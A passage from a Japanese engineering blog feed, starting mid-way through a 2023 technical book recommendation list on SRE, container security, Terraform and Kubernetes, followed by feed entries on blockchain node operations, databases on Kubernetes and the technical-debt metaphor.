Timesなど、様々な企業での事例を紹介しています。本書は、クラウド環境など制御できない環境での信頼性の高いサービスの実行方法、サービスレベル目標に基づくサービスの作成・監視・運用、運用チームをSREに変換する方法、新規開発や既存サービスにおけるSREの始め方などをカバーしています。また、SREとDevOpsの関係性についても詳しく触れています。この本は、前作『SRE サイトリライアビリティエンジニアリング』と対になる本であり、前作が原理と哲学を紹介するのに対し、本書はそれらの原理の適用方法に焦点を当てています。また、Googleだけでなく、さまざまな企業でのSREプラクティスについても解説しています。本書は前作と比較して内容が身近で読みやすく、SREの理解をさらに深めることができます。基本的な用語や他社の事例が分かりやすく説明されており、SREの実践に関して具体的かつ実用的な内容が盛り込まれています。さらに、分散システムの信頼性に関する知識を深めたい方には、『Go言語による分散サービス―信頼性、拡張性、保守性の高いシステムの構築』がおすすめです。この本は『Distributed Services with Go』の翻訳版であり、2022年8月に発売されました。また、『Designing Data-Intensive Applications』も非常に役立ちここ数年で最も読んでよかった技術書の一冊です。この本はデータ集約型アプリケーションの設計における核心的な概念と技術を網羅的に解説し、信頼性の高い分散システム構築に必要な知識が詳細に説明されています。時間を巻き戻して本を読む順番を選べるなら、もっと早く手に取りたかったと感じています。翻訳版である『データ指向アプリケーションデザイン』も知っておくと有益です。関連するイベントの詳細はこちらで確認できます。イベントは既に終了していますが、本の内容を深く理解し、専門家から新しい視点や知見を得る絶好の機会です。このイベントに参加することで、読書体験がより充実したものになることは間違いありません。動画www.youtube.com発表資料 speakerdeck.comちょっと脱線してしまいましたが総じて、『サイトリライアビリティワークブック ―SREの実践方法』は、SREを導入し、SREの考え方をプロダクト開発に導入しようとしている人にとって有益な情報が豊富に含まれています。サイトリライアビリティワークブック ―SREの実践方法オライリージャパンAmazon英語版を読みたい方のために、Googleが無料で公開しているリンクは以下です。sre.googleSoftware Requirements Essentials「私は過去 10 年間でベストセラーになった要件エンジニアリングの本 10 冊を読んだことがあります。この 1 冊には、それらの 10 冊を合わせたものよりも有益な情報が簡潔に記載されています。」--Mike Cohn, author of User Stories Applied and co-founder, Scrum Allianceこの表現が過剰ではないことがわかる一冊である。はやく読みたかった本つながりで。『Software Requirements Essentials: Core Practices for Successful Business Analysis』は、要件開発と管理における20のコアプラクティスを紹介する重要な本です。著者のKarl WiegersとCandase Hokansonは、伝統的なプロジェクトからアジャイルプロジェクトまで、あらゆるアプリケーションドメインにおいて、優れた価値を提供する可能性が最も高いプラクティスに焦点を当てています。これらのコアプラクティスは、チームがビジネス問題を理解し、適切な参加者を巻き込み、より良い解決策を明確にし、コミュニケーションを改善し、最も価値のある機能を適切な順序で実装し、変化と成長に適応するのに役立ちます。これもサブスクで読めるのでおすすめです。ソフトウェア要求 第3版 を読むほど時間がないのであればおすすめです。learning.oreilly.comソフトウェア要求 第3版 の本も読めます(原書)。やっててよかったO\'Reillyサブスクlearning.oreilly.comこの本はソフトウェア要求 第3版を簡潔で焦点を絞った内容であり、「どのように」するかについての実用的な詳細がほどよく含まれているため、すべてのプロジェクト参加者におすすめできます。本書を使用することで、チーム全体が重要な概念、用語、技術、理論について共通の理解を築き、プロジェクトごとにより効果的に協力できます。主な内容には、問題の明確化、ビジネス目標の定義、ソリューションの境界設定、利害関係者と意思決定者の特定、ユーザータスク、イベント、応答の調査、データの概念と関係の評価、品質属性の取り扱い、要件の分析、モデリング、優先順位付け、要件の明確かつ整理された方法での記述、要件のレビュー、テスト、変更管理などが含まれています。Software Requirements Essentials: Core Practices for Successful Business Analysis (English Edition)作者:Wiegers, Karl,Hokanson, CandaseAddison-Wesley ProfessionalAmazon本当に良い内容だったのですが自分が本として言及するには深すぎる内容だったのでざっくり雰囲気を知りたい人はこちらのブログを確認してほしいです。agnozingdays.hatenablog.comシステム障害対応 実践ガイド『3カ月で改善！システム障害対応 実践ガイド』は、システム障害対応とプロセス改善の実践的なアプローチを提供する画期的な本です。著者の野村浩司氏と松浦修治氏は、それぞれNTTデータとリクルートでの豊富な経験を基に、実際の業務に即した方法を提供しています。本書の大きな特徴は、障害対応の具体的な手法を「メソッド化」している点です。理論だけでなく、「どうすればいいのか？」という実践的な問いに答えており、情報システム担当者や運用リーダーにとって最適な内容となっています。また、本書は障害対応の本質的価値にも触れています。障害対応の改善は、顧客満足度、従業員満足度、そして財務観点からもプラスの効果をもたらします。この点を丁寧に説明しており、運用担当者のモチベーション向上にも寄与する内容です。大規模な障害対応経験がない方でも、対応のイメージがつかめるように工夫されています。障害対応の難所にも言及し、読者が共感しやすい内容となっています。システム障害が起こりうるすべての現場の人々に推奨されるこの本は、システム障害対応をどのように捉え、判断し、対応するべきかについてのフローや表を豊富に掲載しています。これらは特にシステム障害マニュアルが整備されていないチームにとって非常に有用です。1000件以上の事例を分析し生み出されたこのメソッドは、障害対応改善のための役立つ雛形と共に、3カ月での改善を可能にします。インシデント分析から障害訓練まで、各プロセスに役立つ情報が満載です。システム障害対応における課題の特定から改善ステップまで、具体的なガイダンスを提供し、障害対応を改善するための実践的な指針を提供します。3カ月で改善！システム障害対応 実践ガイド インシデントの洗い出しから障害訓練まで、開発チームとユーザー企業の「協同」で現場を変える作者:野村 浩司,松浦 修治翔泳社Amazonまた、SREの観点からいうと『Implementing Service Level Objectives』は、SLO文化をゼロから構築するための具体的なガイダンスを提供する貴重な本です。著者のAlex Hidalgoは、ユーザーの視点からサービスの信頼性を測定するSLIの定義、SLO目標の選択と統計的分析、エラーバジェットの利用方法など、SLOベースのアプローチに必要なツールとリソースの構築について詳しく説明しています。このガイドは、SLOデータを活用して経営陣やユーザーに意味のあるレポートを作成する方法を含め、SLOの実装に関わる全てのステークホルダーにとって非常に価値ある本なので読んでほしいです。この分野では「Webエンジニアのための監視システム実装ガイド」、「運用設計の教科書 ~現場で困らないITサービスマネジメントの実践ノウハウ」などもとてもおもしろかったのでおすすめです。learning.oreilly.com国内でもIncident Responseの勉強会があったり、Awesome Incident Responseなどがあるので一読して見るのがよいかなって思いました。incident-response.connpass.comコンテナセキュリティ『コンテナセキュリティ：コンテナ化されたアプリケーションを保護する要素技術』は、Liz Riceによる原著『Container Security: Fundamental Technology Concepts that Protect Containerized Applications』の翻訳版で、コンテナセキュリティに関する深い理解を提供してくれる本です。www.youtube.comこの本は、コンテナへの攻撃経路、Linuxの構造、コンテナの堅牢化、設定ミスによるセキュリティ侵害のリスク、コンテナイメージビルドのベストプラクティスなど、コンテナセキュリティに関する要素技術を幅広くカバーしています。開発者、運用者、セキュリティ専門家にとって、コンテナセキュリティの理解を深めるための優れた本であり、翻訳を担当しました。コンテナセキュリティ　コンテナ化されたアプリケーションを保護する要素技術作者:Liz Rice,株式会社スリーシェイク　監修,水元 恭平　訳,生賀 一輝　訳,戸澤 涼　訳,元内 柊也　訳インプレスAmazon一方で、同様の本もリリースされております。『基礎から学ぶコンテナセキュリティ――Dockerを通して理解するコンテナの攻撃例と対策』は、森田浩平著による、コンテナセキュリティの基本から応用までを解説した本です。Dockerの普及に伴い、コンテナ技術が広く使用されていますが、そのセキュリティ面についての理解が不十分な点が多々あります。この本は、コンテナ利用時のセキュリティ上の問題を防ぎ、安全に活用するための基本的なガイダンスを提供します。コンテナ型仮想化の概要、コンテナの主要な攻撃ルート、堅牢なコンテナイメージの作り方、セキュアなコンテナ環境の構築など、実践的な内容が盛り込まれています。ちなみにContainer Security Book というこれから Linux コンテナのセキュリティを学びたい人のための文書を公開しているのでこちらを最初に読んでみるのが良いかと思います。基礎から学ぶコンテナセキュリティ――Dockerを通して理解するコンテナの攻撃例と対策 (Software Design plusシリーズ)作者:森田 浩平技術評論社Amazonこれらの本は、コンテナセキュリティに関心が高いエンジニアにとって、理論と実践のバランスを持ち、現代のコンテナ環境で必要とされる重要な知識とスキルを提供します。コンテナ技術のセキュリティ面に関する包括的な理解を深めるために、有益です。ちなみに『Docker: Up & Running, 3rd Edition』が2023年にリリースされました。コンテナ技術に関するめちゃくちゃ有用な本です。この最新版は、Sean KaneとKarl Matthiasによって、Dockerの登場から約10年間の大きな変化に対応して大幅に更新されています。知識の新陳代謝のためにもぜひ、読んでみてください。この本では、DockerやLinuxコンテナがクラウドサービスやKubernetesとどのように統合されるか、OCIイメージの構築、Linuxコンテナのデプロイと管理、依存関係管理やアプリケーションのデプロイワークフローの単純化、本番環境でのLinuxコンテナのデプロイとテストの実用的なテクニックなど、広範囲にわたるトピックが取り上げられています。BuildKit、マルチアーキテクチャイメージサポート、ルートレスコンテナなど、新機能の追加カバレッジもあります。learning.oreilly.comTerraform: Up and Running, 3rd Edition『Terraform: Up and Running, 3rd Edition』は、Terraformについての優れた入門書です。とりあえず、何も考えずにTerraform を書くなら読んでほしいです。本書は、Terraformを使用して、様々なクラウドや仮想化プラットフォームでインフラをコードとして定義、立ち上げ、管理する方法を示しています。著者Yevgeniy (Jim) Brikmanは、Terraformのシンプルで宣言的なプログラミング言語を通じて、インフラを数コマンドでデプロイおよび管理する方法を示すコード例を提供しています。この第3版は、Terraform 1.0に対応するために大幅に拡張され、最新の情報が追加されています。Terraformの基本から、大量のトラフィックをサポートし、大規模な開発チームを運営できるフルスタックの実行まで、システム管理者、DevOpsエンジニア、初心者開発者が素早く学べる内容になっています。本書の最大の特徴は、ただコードをコピー＆ペーストするのではなく、読者自身に実際に作業を行わせることを強く推奨している点です。実際に手を動かして学ぶことが、Terraformの理解を深める最善の方法だと著者は語っています。また、gitやdockerなど、本書で使用されるすべての技術について、読者が日常業務で別のツールを使用している場合でもついていけるようにミニチュートリアルが用意されています。さらに、本書は、IaC（Infrastructure as Code）とDevOpsの実践、Terraform、パブリッククラウド、バージョンコントロールの統合、プロビジョニングツールを通じてインフラを作成・デプロイする効果について、基本から細かなニュアンスまでをわかりやすく説明しています。実際にコードを書いてテストする経験は、初心者にとって非常に価値のある学びの機会となります。Infrastructure as Code の3版もEarly Releaseされています(翻訳されて...)。learning.oreilly.comTerraformは進化し続けており、最新機能は絶えず追加されています。例えばTerraform v1.6のtestが追加されますが本書では一切触れられておりません。そのため、最新のリリースや動向に注意を払い続けることが重要です。また、HashiCorpがTerraformを含む自社製品のライセンスをオープンソースから変更したこともあり、今後もその動向に注目する必要があるでしょう。Terraformのフォークが「OpenTofu」としてLinux Foundation傘下で正式ローンチ。OpenTFから改名総じて、TerraformやIaCを学び、理解し、実践したい人にとって、非常におすすめの入門 本です。翻訳本が2023年11月21日に出ましたね。幸せです。詳解 Terraform 第3版 ―Infrastructure as Codeを実現する作者:Yevgeniy Brikmanオーム社AmazonEfficient Go『Efficient Go: Data-Driven Performance Optimization』は、計測方法や目的設定から方法から始まり、様々なレベルでの効率を最適化する方法、CPUやメモリなどの一般的なリソースを効果的に使用する技術、Prometheus、Jaeger、Parcaなどのオープンソースプロジェクトを通じてメトリクス、ログ、トレーシング、（連続的な）プロファイリングによる効率評価方法、go test、pprof、benchstat、k6などのツールを使用して信頼性のあるマイクロおよびマクロベンチマークを作成する技術に至るまで、幅広い内容が網羅されています。また、Goの機能であるスライス、ジェネリクス、ゴルーチン、割り当てセマンティクス、ガベージコレクションなどを効率的に使用する方法についても解説されており、記事として散見されるものがまとめて読めることと自体に勝ちがある。加えて最適化の限界を超えると、得るものと失うものが等しくなるみたないマインドセットの部分も含めてとても価値があるのでGoやシステムの最適化を目指す方には必読の内容かと思います。Efficient Go: Data-Driven Performance Optimization作者:Plotka, BartlomiejOreilly & Associates IncAmazonKubernetes Best Practices, 2nd Edition『Kubernetes Best Practices, 2nd Edition』は、Kubernetesを活用してアプリケーションを構築するプロセスに焦点を当てた実践的なガイドです。著者たちは、分散システム、エンタープライズアプリケーション開発、オープンソース分野での豊富な経験を活かし、最新のKubernetesの機能や新しいツールに関する知見を提供しています。この本は、Kubernetesの基本概念に精通しているが、最新のベストプラクティスに迅速に対応したい開発者やアーキテクトに最適です。また、既にある程度の知識を持っている方にとって、知識を更新し、新たな視点を得るためのデトックスにも役立ちます。入門書を読みたいならKubernetes: Up and Running, 3rd Editionを読めばよいとおもいます。最新のKubernetesの機能、新しいツール、および廃止された機能についてカバーされており、意外と知らなかったり古くなっている知識があったので知識のデトックスにもオススメです。一方で、『Kubernetes Patterns, 2nd Edition』は、クラウドネイティブアプリケーションの設計と実装におけるパターンと原則に重点を置いています。著者のBilgin IbryamとRoland Hussは、再利用可能なパターンとKubernetesに特化した解決策を提供し、具体的なコード例を通じてこれらのパターンを実演します。読者は、コンテナベースのクラウドネイティブアプリケーションの構築と運用に関する基本原則や、より複雑なトピックを含む様々なパターンを学ぶことができます。個人的にはKubernetes Best Practices, 2nd Editionは良識ある大人が寄ってきてKubernetesについて手取り足取り教えてくれる本。learning.oreilly.comKubernetes Patterns, 2nd Edition はKubernetes について知りたいって言ったら勢いよくオタクが寄ってきてその全てを教えて去っていく本。learning.oreilly.com総じて、『Kubernetes Best Practices』はKubernetesの進んだ使い方やベストプラクティスに焦点を当てており、『Kubernetes Patterns』はKubernetesを用いたアプリケーション設計における具体的なパターンと原則に重点を置いています。どちらの本も、Kubernetesの利用を最大限に活かしたいと考える技術者にとって読んで損のない二冊だと思います。ルールズ・オブ・プログラミング『ルールズ・オブ・プログラミング ―より良いコードを書くための21のルール』は、大ヒットゲーム『Ghost of Tsushima』の開発現場で培われた、ゲーム制作スタジオSucker Punch Productionsの共同創設者であるChris Zimmermanによる、すべてのプログラマーにとって必読のプログラミング哲学です。この本では、プログラミングに関する21の本質的なルールが紹介されており、単純化とバランスの取り方、バグの扱い、命名の重要性、一般化のプロセス、最適化のタイミング、コードレビューの価値、失敗の回避、実行されないコードの対応、複雑性の管理など、プログラミングにおける幅広いトピックにわたる洞察が提供されています。C++で書かれたコード例を用いながらも、C++の知識がない読者でも理解できるよう配慮されており、PythonやJavaScriptプログラマー向けのC++コード読解法も掲載されています。この本は、入門書では決してないですがトレードオフを意識したことがある全てのプログラマーにとってプログラミングの日々の課題を解決し、優れたコードを書くための実践的なガイドとして推奨されます。あと、この本はWIP: 2023年 俺が愛した本たち 非技術書編 - じゃあ、おうちで学べるでも紹介した『プログラマー脳 ～優れたプログラマーになるための認知科学に基づくアプローチ』の後に読んだのでそれらの制約やルールは人間の脳や認識の制約によって成り立っているものだなって思いました。ルールズ・オブ・プログラミング ―より良いコードを書くための21のルール作者:Chris Zimmermanオーム社Amazonこちらは、『ルールズ・オブ・プログラミング』を2倍楽しむための1つのルール というイベントの動画があるのでぜひご覧いただきたいです。www.youtube.com『Good Code, Bad Code』は、Googleのテックリードである著者が、高品質なコードを書くための「コーディングの4つのゴール」と「品質6つの柱」を提案しています。この本は、コードの読みやすさ、誤用の防止、モジュール化、再利用性、テストのしやすさなど、日々の開発業務で直面する課題に対して、具体的で実践的なアドバイスを提供しています。著者の経験に基づいたアプローチは、プログラミングにおける理想論ではなく、現実的で実用的な解決策を提示しています。この本は、コードの品質を高めるための具体的な手法として「コーディングの4つのゴール」と「品質6つの柱」を提示しています。「コーディングの4つのゴール」には、1) 正しく動くこと、2) 正しく動作し続けること、3) 要件の変更に対応しやすいこと、4) 車輪の再発明をしないこと、が含まれます。これらのゴールは、コードの堅牢性と信頼性を保ちながら、変化に柔軟に対応できることを重視しています。また、「コード品質の6つの柱」は、1) 読みやすさ、2) 想定外の事態をなくす、3) 誤用しにくいコードを書く、4) モジュール化、5) 再利用・汎用化のしやすさ、6) テストのしやすさと適切なテスト、に焦点を当てています。これらは、コードを効果的かつ効率的に管理するための基本的な要素であり、エンジニアが日々の開発業務で直面する課題を解決するための実践的なアドバイスを提供しています。Good Code, Bad Code ～持続可能な開発のためのソフトウェアエンジニア的思考作者:TomLong,秋勇紀,高田新山,山本大祐秀和システムAmazonあと、忘れてほしくないのが我らがKent Beck先生の『Tidy First?』（日本語訳：まずは整理整頓）です。この実践的ガイドでは、エクストリーム・プログラミングの創始者でありソフトウェアパターンの先駆者である著者が、コードを読みやすく整理する「タイディング（Tidying）」の適切なタイミングと場所を提案しており、大きな関数や複雑なシステムを小さなステップで安全に改善する方法、ソフトウェア設計の理論的な側面と実践的なスキルの融合など、人間関係の観点からのソフトウェア設計を深く掘り下げています。この本は、単にコードを綺麗にするテクニックを教えるだけでなく、ソフトウェアの品質を向上させ、開発プロセスを効果的かつ効率的にするための全体的な視野を提供してくれます。技術コンサルティングを行う上で、この本を参考にする機会が多く、多くのプロジェクトでその洞察とアプローチが非常に役立ちました。learning.oreilly.comこれらの本に本当に優劣とかないですが同系統の書籍なので一緒に紹介させていただきました。さいごに今年一年を通して読み漁った数々の技術書は、私にとって新たな知識の扉を開く鍵となりました。それぞれの本が持つ独自の視点や深い洞察は、技術者としての私の視野を広げ、思考を豊かにしてくれました。皆さんからのおすすめの本も、来年の読書リストに加えて楽しみにしています。読書は単なる趣味ではなく、私たちの知識を形成し、成長させる重要な行為です。皆さんも、来年は私と一緒に、新たな知識の探求に挑戦してみませんか？ それでは、2024年も充実した読書ライフをお過ごし下さい。読書を通じて、皆さんが新しい自分を発見し、さらなる成長を遂げる一年となりますように。","link":"https://syu-m-5151.hatenablog.com/entry/2023/12/02/141455","isoDate":"2023-12-02T05:14:55.000Z","dateMiliSeconds":1701494095000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Lima で vz + rosetta を使って ARM VM 上で x86_64 バイナリを実行する","contentSnippet":"この記事は、3-shake Advent Calendar 2023 2日目のエントリ記事です。2023年10月に Docker Desktop for Apple silicon での Rose…","link":"https://qiita.com/yteraoka/items/0d793d06cddccad73b0b","isoDate":"2023-12-01T22:02:03.000Z","dateMiliSeconds":1701468123000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"ブロックチェーンノード運用の苦労話","contentSnippet":"アドベントカレンダーこの記事はSRE Advent Calendar 2023 2日目の記事です。1日目はしょっさんのGitHubのorganization移行をやったお話でした。転職しました2023年11月30日で、暗号資産交換業者ビットバンクを退職し、12月1日にスリーシェイクに入社しました。ビットバンクでは関係各位お世話になり、ありがとうございました。スリーシェイクでは、皆様お世話になります。SRE構築総合支援サービスを行うSreake事業部にて、これからガッツリとSREの世界で頑張っていきます！日本のSREを盛り上げていきたいと思います。SREの皆様、よろしくお願いいたします！これまでやってきたブロックチェーンのキャリアについて私は、ビットバンクの前は、フレセッツという暗号資産交換所向けウォレットベンダーにいました。途中買収により、HashPortに。暗号資産業界にかれこれ5年いて、ウォレットの新規開発フェーズだったフレセッツでの最初の1年を除いて、4年間はブロックチェーン領域のEmbeded SREをやってました。この記事を書いているときは、スリーシェイクに入って1日目が終わったところであり、スリーシェイクでの経験で書くのが無理なので、自分のキャリアの棚卸しも兼ねて、これまでのブロックチェーンのことを振り返ろうかな、と思います。ブロックチェーンノード構築、運用はインフラエンジニアの仕事であり、SREの皆さんもやる機会があるかもしれないので、参考になれば幸いです。ブロックチェーンノードビットコインやイーサリアムなどの暗号資産（仮想通貨）について名前は聞いたことあるかな、と思いますが、トランザクションやブロックのデータを蓄えている分散台帳です。「フルノード」という言葉を聞いたことがあるかもしれません。ビットコインのフルノードの場合は、過去から全てのトランザクションとブロックデータを持っています。イーサリアムなどの通貨によってはフルノードでも全てのデータを持っておらず、アーカイブノードが全てのデータを持っているなど名前が異なったりしますwここではブロックチェーンノードということにします。ブロックチェーンノード運用の何が大変かフレセッツに在職していた当時、同僚が書いたブロックチェーン徒然日記も併せてご覧ください。インスタンスとコストブロックチェーンノードというのはアプリケーションとデータベースを持っており、特殊なシステムと言えるかな、と思います。CPU、メモリをくうて、でかいサーバーが必要です。ブロックチェーンデータが大きすぎるため、AWSでいうとFargateは使えず、EC2を使う必要があります。m5.xlargeとかxlarge、2xlargeなどでかいインスタンスを使用してコストもすごいです。コストを少しでも抑えるため、適切なインスタンスサイズを模索するのも大事な仕事でした。ビットバンクにいたときは、通貨数もどんどん増えて、通貨ごとに異なるブロックチェーンノードの種類もどんどん増えていきました。個人でブロックチェーンノードを利用する際、ノード内のウォレットを使用したりしますが、商用利用する際は、安全性を考えて、安全な設計のウォレットをノードの外部で動かします。ブロックチェーンノードは参照のみでよいため、複数の開発環境のノードを1台にまとめて、複数環境のウォレットからアクセスするなど、コスト削減も推進しました。最近話題のFinOpsを実践できたとも言えます。Gethが高負荷で落ちたり同期遅延イーサリアム(Ethereum)のノードgo-ethereum(通称Geth)を2019年とかに運用していたときは、品質も悪く、高負荷でプロセスが死んだり、ブロックの同期遅延が起こったりして大変だったな、と思い出しました。あとは、Ver.の違いでチェーンの分岐が起こる事故起こったり、致命的なバグのHot-Fix版が出た数日後にバグを突かれてチェーンの分岐が起こったり。なかなか大変でしたね。ビットコインと同じくマイニングしてブロックを生成するPoWから2022年9月にステーキングしたバリデータノードがブロック生成するPoSに移行した後は安定したと思います。Web3のプロジェクトとかやるとなると、Geth使うかもしれませんが、今はマシです。Polygonなどのノードではデータが6TB同じくWeb3のプロジェクトで、Polygonノードの運用とかやるなら大変ですよ。ブロックチェーンデータが6TBとかあるので。。。Gethの場合は初期から同期しても、インスタンスのサイズによりますが、1週間とかでできるものの、Polygonの場合は永遠に終わらないので、公式が配布しているSnapshotをダウンロードして展開してからプロセスを起動するのですが、Snapshotのダウンロードだけで丸一日かかったりします。これだけデータがでかいと途中でダウンロード失敗することもあり、やり直しが何回も発生して大変でした。振り返ってブロックチェーンノードの稼働自体は難しくないのですが、ブロックチェーンネットワーク自体がおかしくなると、ウォレットの入出金を止める必要があったり、外乱も大きなシステムでした。こんなじゃじゃ馬と格闘したのもいい経験です。これからは一旦ブロックチェーンは一区切りで、これからはスリーシェイクのSreakeにて、kubernetes等を使用したクラウドネイティブなアーキテクチャを構成していき、効率的に信頼性を高める仕事をしていきます。はてなブログを開設して1記事目が今回でしたが、今後も記事を増やしていきたいと思います。ブロックチェーンでマニアックだったかと思いますが、最後までお読みいただきありがとうございました。次回はSRE Advent Calendar 2023 3日目はみゅーみくすさんのゆるやか成長スタートアップのEnabling SRE的活動です！","link":"https://shu-kob.hateblo.jp/entry/2023/12/02/001347","isoDate":"2023-12-01T15:13:47.000Z","dateMiliSeconds":1701443627000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"データベースエンジニアのためのDB on Kubernetes入門ガイド","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 1日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめに1959年にW. C. McGeeがデータベースという概念を提唱してから約65年、様々なアーキテクチャのデータベースが提案され様々なプラットフォームで利用されてきました。古くはメインフレームを中心に動作していたデータベースは、マイコンブームとともにそのアーキテクチャを変えながらにオープン系システムへと主戦場を移して行きました。オープン系が主流になってからもその進化は止まることなく、ベア...","link":"https://zenn.dev/nnaka2992/articles/db_on_k8s_guide_for_db_engineers","isoDate":"2023-11-30T23:30:01.000Z","dateMiliSeconds":1701387001000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"データベース輪読会をやってみた話","contentSnippet":"はじめに こんにちは。株式会社スリーシェイク Sreake 事業部に所属している @suganamao です。Sreake 事業部は技術力が求められる領域で豊富な経験を持つ SRE の専門家が集まったチームです。事業部に […]The post データベース輪読会をやってみた話 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/database-reading-circle/","isoDate":"2023-11-29T03:45:53.000Z","dateMiliSeconds":1701229553000,"authorName":"Sreake","authorId":"Sreake"},{"title":"KEP-4188: New kubelet gRPC API with endpoint returning local pods info","contentSnippet":"!KEP 持ち寄り会 #1 の登壇資料です。2023/11/27 時点の KEP-4188 の内容です。Kubernetes 1.29 時点で機能として入っていないので注意して下さい。また、後半の文章は考察を含んでおり、正確な情報でない可能性があります。 概要KEP-4188 は、Kubelet に Pod Conditions を公開する gRPC API を追加する KEP です。Pod Conditions は Status フィールドに含まれています。❯ kubectl get pods -n kube-system coredns-5d78c9869d-8gglh ...","link":"https://zenn.dev/toversus/articles/791c7916e21059","isoDate":"2023-11-27T08:23:13.000Z","dateMiliSeconds":1701073393000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"GitHubとCircleCIからFour Keysを計測する","contentSnippet":"はじめに Sreake事業部でインターンをしている村山です。私は以前に、DORAチームの提案したFour Keysという指標の計測システムの調査・検証を行いました。以前の検証では、GitHubとGitLab、及びモックデ […]The post GitHubとCircleCIからFour Keysを計測する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/four-keys-with-github-circleci/","isoDate":"2023-11-22T01:25:41.000Z","dateMiliSeconds":1700616341000,"authorName":"Sreake","authorId":"Sreake"},{"title":"BigQueryの メタデータってどこから見れるの？","contentSnippet":"whatBigQueryのメタデータの取得先について簡単にまとめたもの BigQueryのメタデータ、調べることが出来るの?A. 出来るということで、メタデータの主な取得先について記載していく テーブル情報やレコード数BigQueryにはINFORMATION_SCHEMAという、メタデータなどを保持しているビューが存在している。これらを利用してメタデータを取得することが出来る。ただし、テーブルの更新日やテーブルのデータ量については記録されていない。https://cloud.google.com/bigquery/docs/information-sche...","link":"https://zenn.dev/nedoko_dok0dko/articles/f6ccafeceac4a3","isoDate":"2023-11-21T10:26:24.000Z","dateMiliSeconds":1700562384000,"authorName":"seno","authorId":"seno"},{"title":"走馬灯のIaCは考えておいて","contentSnippet":"走馬灯のIaCは考えておいてというタイトルで登壇してきました\\r\\r技術的負債に向き合う Online Conference\\rhttps://findy.connpass.com/event/297813/\\r\\r走馬灯のセトリは考えておいての短編はどれも面白いのでオススメです。\\rhttps://www.hayakawa-online.co.jp/shopdetail/000000015282/\\r\\r登壇ブログ |『走馬灯のIaCは考えておいて』というタイトルで登壇しました。\\rhttps://syu-m-5151.hatenablog.com/entry/2023/11/21/132144","link":"https://speakerdeck.com/nwiizo/zou-ma-deng-noiachakao-eteoite","isoDate":"2023-11-21T05:00:00.000Z","dateMiliSeconds":1700542800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"『走馬灯のIaCは考えておいて』というタイトルで登壇しました。","contentSnippet":"概要2023年11月23日、私は技術的負債に向き合う Online Conference 」にて「走馬灯のIaCは考えておいて - Infrastructure as Codeの導入において技術的負債を考える」というテーマで登壇しました。このセッションでは、Infrastructure as Code（IaC）の実践方法と、技術的負債に対処する際の考慮点について深掘りしました。資料かなり概念系の資料になっているので実践編の登壇の登壇したいので誰か招待してくれ！！！この辺を先に整理しておかないと先の進化的アーキテクチャやA Philosophy of Software Designの話ができないので前提条件をまとめておきました。 speakerdeck.com技術的負債というメタファー に対する違和感私は、技術的な負債についての一般的な表現に違和感を感じています。この点で、まつもとりーさんも技術的負債という表現に対して抵抗を感じていたようです。M年N回目なんですけど、技術的負債という言語化にはずっと抵抗がありまして.......困ったな— まつもとりー / Ryosuke Matsumoto (@matsumotory) 2023年11月21日  この言葉の「負債」という部分が、技術的な問題の本質や性質を正確に捉えていないと感じたため、私は「技術的な腐敗と発酵」という言葉に置き換えることにしました。この新しいメタファーは、技術的問題が時間の経過とともに変化し、時には複雑化や悪化するプロセスをより的確に表現しています。例えば、「腐敗」は、問題が放置されることでシステムの健全性が低下する様子を示し、「発酵」は、初めは小さな問題が時間とともに変化し、場合によっては新たな価値を生み出す可能性があることを意味します。この観点から、私は自身のプレゼンテーションや議論の中で、技術的な問題を扱う際にこれらの言葉を使用しました。普通に元ネタがあります。メタファーとしての発酵 (Make: Japan Books)作者:Sandor Ellix KatzオライリージャパンAmazon実生活の発酵と腐敗の違い実生活における「発酵」と「腐敗」はどちらも微生物の作用による物質の変化プロセスであり、人間にとっての利益に基づいて定義されます。発酵は、生物の作用によって物質が変化し、人間にとって有益なものに変わるプロセスを指し、ヨーグルト、チーズ、醤油などが例として挙げられます。一方、腐敗は同じく微生物の作用による物質の変化ですが、不快な臭いや有害な物質が発生し、人間にとって有害とされるプロセスを指します。この考え方は、インフラの世界にも当てはまります。時間の経過とともに技術が進化し、新しい技術が古い技術に取って代わることが多い中で、長く使用され信頼性が高まった「枯れた技術」は発酵に、時代遅れとなりリスクを引き起こす技術は腐敗に例えられます。これにより、古い技術を見直し、必要に応じて新しい技術に移行するかの判断が容易になり、インフラの健全性と持続可能性を保つ上で重要な役割を果たします。発酵と腐敗・熟成の違いって何？負債と言わないことが負債と向き合うこと「負債と言わないことが負債と向き合うこと」という素晴らしい発表があった。メタファーの限界と実際の技術的課題への取り組みの重要性を改めて感じました。この発表は、言葉だけでなく、根本的な問題解決に焦点を当てることの大切さを示しています。私は向き合わずに逃げたので...。確かに、メタファーは理解を深めるための一つの手段ですが、それにとどまらず、具体的な問題や課題に目を向け、解決策を見つけて実行することが不可欠です。この点において、私は自分の業務、特にSRE（Site Reliability Engineering）の領域において「トイル」という用語が使われていることに気づきました(これも状況を整理するためのメタファーではある)。「トイル」とは、SREのコンテキストで使われる用語で、繰り返し行われる、自動化されていない、戦略的価値の低い作業を指します。この用語を用いることで、SREは単に作業を行うのではなく、その作業がなぜ存在し、どのように改善できるかを考えるように促されます。このような言葉の使い方は、メタファーを超えて、実際の作業の性質や価値を正確に捉え、それに基づいて改善策を模索する手助けとなります。最終的には、このような言葉の使い方が、より効果的で生産的な仕事に取り組むことができます。言葉は単なるコミュニケーションの道具ではなく、私たちの思考や行動に影響を与える強力なツールです。そのため、技術的な課題に取り組む際には、適切な用語を選び、それを戦略的に活用することが重要です。sreake.com speakerdeck.com何が技術的負債に変わるのか技術的負債という言葉のメタファーとしての強さ。技術的負債に向き合う幾つかのヒントをいくつかいただいたので気になった人はぜひ、読んでみてほしい。junkyard.song.mu決定版・ゲームの神様 横井軍平のことばが気になったのでAmazonで調べたところ2023年11月21日現在では20000円だった。ソフトウェアの内部品質に生じる様々な問題は組織設計にその原因があることも多い良い内容だったので感想書く speakerdeck.com異なる思想で書かれたコードの統一に動く -Terraformの場合-良い内容だったので感想書く 